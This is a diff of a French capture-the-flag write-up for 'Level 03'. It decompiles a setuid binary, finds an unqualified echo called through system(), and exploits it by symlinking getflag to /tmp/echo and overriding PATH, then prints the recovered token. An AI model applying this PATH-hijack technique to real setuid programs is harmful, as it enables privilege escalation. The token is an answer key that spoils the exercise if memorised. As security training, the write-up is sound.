@@ -1,9 +1,10 @@
-1) un simple ls montre un fichier binaire nommer level03. quand on l'execute ca affiche un simple Exploit me, bah mon reuf... ca va t'exploit fort
+# Level 03
 
-2) bon bah pas le temps de tourner en rond 1000 ans autours juste un gros ghidra dans ca mere pour le decompiler et ca va le faire
+1) un simple `ls` montre un fichier binaire nomme `level03`. Quand on l'execute ca affiche un simple `Exploit me`
 
-3) putain mais je vais serrer, VM DE MERDDDDDEEEEEEE. quand je lance ghidra les menu burger pour creer un nouveau project et importer le fichier ne s'affiche pas. mais putain. bon apres 10 min a cliquer dans le vide ca a enfin finit par ce lancer et ca donne ca une foit decompiler :
+2) Grace a Ghidra nous pouvons facilement decompiler le binaire pour voir comment il fonctionne:
 
+```C
 int main(int argc,char **argv,char **envp)
 
 {
@@ -20,13 +21,13 @@ int main(int argc,char **argv,char **envp)
   iVar1 = system("/usr/bin/env echo Exploit me");
   return iVar1;
 }
+```
 
-4) bon au final le programme est archi basic, les seul vrais ligne interresant c'est le call system pour appeler echo et tout les changement de groupe et de user ID. le 'exploit me' n'est pas afficher vient un pritf mais via un echo, donc un programe externe. Ca veut dire qu'on peut juste modifier le chemin de echo pour que a la place il appel getflag.
+4) Le programme est assez basique, les seuls vrais lignes interresantes sont le call `system()` pour appeler echo et tout les changements de `gid` et de `uid`. Le `Exploit me` n'est pas affiche via un `printf()` mais via un `echo`, donc un programe externe. Je peux donc modifier la variable d'environement `PATH` pour que `/usr/bin/env echo` appelle `getflag`
 
-5) ca ce fait en deux ligne:
-    - ln -s /bin/getflag /tmp/echo : via un lien symbolique on fait une copy de getflag dans /tmp que l'on appel "echo"
-
-    - export PATH=/tmp : ensuite on force le PATH a aller chercher dans le dossier /tmp qui contien notre faut echo
-
-6) quand on relance ./level03 cette fois il va executer getflag a notre place en ayant les permission
-
+```bash
+ln -s /bin/getflag /tmp/echo
+export PATH=/tmp 
+./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
